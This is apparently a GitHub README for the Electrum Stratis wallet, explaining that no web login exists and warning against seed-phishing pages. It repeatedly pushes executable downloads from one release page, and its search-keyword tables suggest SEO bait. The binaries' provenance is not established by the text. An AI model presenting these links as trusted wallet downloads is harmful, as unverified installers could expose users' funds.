![Electrum-Stratis](assets/banner-article.png)

# Stratis wallet login pages that do not exist, and what to do instead

<p align="center">No account, no browser, no reset email</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

There is no Electrum Stratis login page, no web account and no "forgot password" link, because the wallet is software on your machine rather than a service. Any page offering a Stratis or STRAX wallet login is either a different product or an impersonation. What exists is a password that unlocks a local file, and a seed that restores it. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you searched | What exists | Where to go |
|---|---|---|
| "stratis wallet login" | Nothing - there is no account | Local password, or restore |
| "stratis wallet login app" | A desktop application, not a login | Download the real build |
| "stratis wallet login forgot password" | No reset exists | Seed route |
| "strax wallet login" | A different asset with its own wallets | Check the chain first |

</div>

The pattern to recognise: a page that asks for a seed phrase to "log in" is not a wallet, whatever it calls itself.

## Why it happens

Self-custody means the keys are on your device and nowhere else, which removes the entire category of account management: no sign-up, no email verification, no password reset, no session. The password belongs to one file on one machine, which is why it cannot be reset from a website and why a second machine, or a second user account on the same machine, asks for it separately. The password in a self-custody wallet is a local decryption key, not a credential a server can check.

That creates a gap that impersonators fill. People search for a login because every other financial product has one, and search results oblige with pages that look like a login. The tell is always the same: a legitimate wallet never needs your seed to open, and never asks for it through a browser.

The maintained build, with its current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), has no web component at all: the only interface is the application you installed.

## Fix

1. **Stop looking for a login page.** There is no account to log into. If you have the application, open it; if you do not, download it from the release page.
2. **Use the password you set locally.** It unlocks the wallet file on that machine. If it is forgotten, the file can test guesses and the seed can rebuild the wallet.
3. **Restore from the seed when the password is gone.** Choose Recover, enter the phrase in the wallet window, confirm the address preview, and set a new password.
4. **Check which chain you actually want.** A "STRAX wallet login" search is about a different asset and a different chain; this wallet holds legacy STRAT only.
5. **Close any page that asks for a seed.** Do not enter the phrase, do not "verify" it, and do not download anything it offers. Report the page where you found it.

If a page has already received a seed, treat that wallet as compromised: create a new wallet from a phrase generated by the [Electrum Stratis backup models](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md), move the funds, and stop using the exposed phrase. If what you actually need is the application rather than a login, get it from [the current Electrum Stratis download](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md).

## If that did not work

If you cannot remember whether you ever had a wallet at all, the seed or the file is the evidence. Without either, there is nothing to open and no account to recover.

If an application opens but rejects every password, the file may belong to a different wallet or be damaged. Confirm its location and date before assuming the password is wrong, since a copied file beside the original is easy to open by mistake. Import it through the wallet's own file import, which reports a reason rather than failing silently.

If a page you used looked convincing, check what it asked for. A page that asked only for an email leaked an email; a page that asked for a seed leaked the wallet. The response differs entirely.

## Prevention

- Bookmark the release page instead of searching for downloads or logins.
- Never enter a seed into a browser, ever, for any reason.
- Keep the wallet application installed so "how do I log in" never becomes a search.
- Record which chain and which wallet each seed belongs to.
- Treat urgency in a wallet page as evidence of fraud.
- Close any page that offers a wallet login, and open the installed application instead.

## FAQ

### Is there a Stratis wallet login?

No. Electrum Stratis is a desktop application with a local password; there is no account, no session and no web login. A page offering one is not this wallet.

### Is there a Stratis wallet login app?

The wallet is an application, not a login service, and it runs on Windows, macOS and Linux. Installing it is the closest thing to "an app"; there is no separate login client, and no mobile build exists.

### I forgot my Stratis wallet login password. How do I reset it?

There is no reset. The password decrypts a local file, so the route back is the seed: restore the wallet into a fresh file with a new password. If the seed is also lost, the file can only be tested against candidate passwords.

### Is a STRAX wallet login the same thing?

No. STRAX is the asset on the chain that replaced the legacy one, and it has its own wallets and services. This wallet serves the legacy chain, so a STRAX login page is either a different product or an impersonation.

<!-- DOWNLOAD-BLOCK -->

A self-custody wallet has no account, so it has no login. The application opens a file on your machine and decrypts it locally; there is no server that could accept a username. Any page showing a login form with a wallet logo is collecting credentials for an account that does not exist, and the correct action is to close it and open the installed application instead.

## Related articles

- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
- [Crypto recovery scams](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md)
- [What Electrum Stratis actually is](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-this-wallet-is.md)
